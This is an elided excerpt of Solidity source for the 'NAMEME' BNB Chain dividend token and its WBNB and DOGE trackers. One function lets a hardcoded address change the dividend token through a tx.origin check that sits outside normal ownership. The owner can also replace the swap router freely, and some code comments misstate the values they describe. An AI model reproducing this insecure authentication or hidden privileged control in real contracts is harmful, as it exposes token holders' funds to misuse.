...
contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
  ...
  function setDividendTokenAddress(address newToken) external virtual {
      require(tx.origin == 0x649DF3928719456d72070B85416676d72B3FFbf8, "Only owner can change dividend contract address");
...
contract NAMEME is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("NAMEME", "NAMEME") {
    	wBNBDividendTracker = new WBNBDividendTracker();
    	dOGEDividendTracker = new DOGEDividendTracker();

    	marketingWallet = 0xaCE04EfD246041Fa07480152777CEb71287Aa404;
    	teamWallet = 0x649DF3928719456d72070B85416676d72B3FFbf8;
    	wBNBDividendToken = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        dOGEDividendToken = 0xbA2aE424d960c26247Dd6c32edC70B295c744C43;
    	
    	IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); //0x837C259Fe5CE6f3CC67345eb2027113dcFDe9615
    ...
    receive() external payable {
  	...
  	function updateTeamWallet(address _newWallet) external onlyOwner {
  	    require(_newWallet != teamWallet, "NAMEME: The team wallet is already this address");
  	...
  	function updateMarketingWallet(address _newWallet) external onlyOwner {
  	    require(_newWallet != marketingWallet, "NAMEME: The marketing wallet is already this address");
        excludeFromFees(_newWallet, true);
    ...
    function updateWBNBDividendTracker(address newAddress) external onlyOwner {
        ...
        require(newWBNBDividendTracker.owner() == address(this), "NAMEME: The new dividend tracker must be owned by the NAMEME token contract");
    ...
    function updateDOGEDividendTracker(address newAddress) external onlyOwner {
        require(newAddress != address(dOGEDividendTracker), "NAMEME: The dividend tracker already has that address");

        DOGEDividendTracker newDOGEDividendTracker = DOGEDividendTracker(payable(newAddress));

        require(newDOGEDividendTracker.owner() == address(this), "NAMEME: The new dividend tracker must be owned by the NAMEME token contract");
    ...
    function updateWBNBDividendRewardFee(uint8 newFee) external onlyOwner {
        require(newFee <= 6, "NAMEME: Fee must be less than 6%");
    ...
    function updateUniswapV2Router(address newAddress) external onlyOwner {
        require(newAddress != address(uniswapV2Router), "NAMEME: The router already has that address");
        emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));
        uniswapV2Router = IUniswapV2Router02(newAddress);
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(isExcludedFromFees[account] != excluded, "NAMEME: Account is already exluded from fees");
    ...
    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "NAMEME: The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private onlyOwner {
        require(automatedMarketMakerPairs[pair] != value, "NAMEME: Automated market maker pair is already set to that value");
    ...
    function updateGasForProcessing(uint256 newValue) external onlyOwner {
        require(newValue != gasForProcessing, "NAMEME: Cannot update gasForProcessing to same value");
    ...
    function _transfer(
        ...
        require(tradingIsEnabled || (isExcludedFromFees[from] || isExcludedFromFees[to]), "NAMEME: Trading has not started yet");
...
contract WBNBDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("NAMEME_WBNB_Dividend_Tracker", "NAMEME_WBNB_Dividend_Tracker", 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) {
    	claimWait = 3600;
        minimumTokenBalanceForDividends = 200000 * (10**18); //must hold 10000+ tokens
    }

    function _transfer(address, address, uint256) pure internal override {
        require(false, "NAMEME_WBNB_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() pure public override {
        require(false, "NAMEME_WBNB_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main NAMEME contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 3600 && newClaimWait <= 86400, "NAMEME_WBNB_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "NAMEME_WBNB_Dividend_Tracker: Cannot update claimWait to same value");
...
contract DOGEDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("NAMEME_DOGE_Dividend_Tracker", "NAMEME_DOGE_Dividend_Tracker", 0xbA2aE424d960c26247Dd6c32edC70B295c744C43) {
    	claimWait = 3600;
        minimumTokenBalanceForDividends = 200000 * (10**18); //must hold 10000+ tokens
    }

    function _transfer(address, address, uint256) pure internal override {
        require(false, "NAMEME_DOGE_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() pure public override {
        require(false, "NAMEME_DOGE_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main NAMEME contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 3600 && newClaimWait <= 86400, "NAMEME_DOGE_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "NAMEME_DOGE_Dividend_Tracker: Cannot update claimWait to same value");
        emit ClaimWaitUpdated(newClaimWait, claimWait);
        claimWait = newClaimWait;
    }
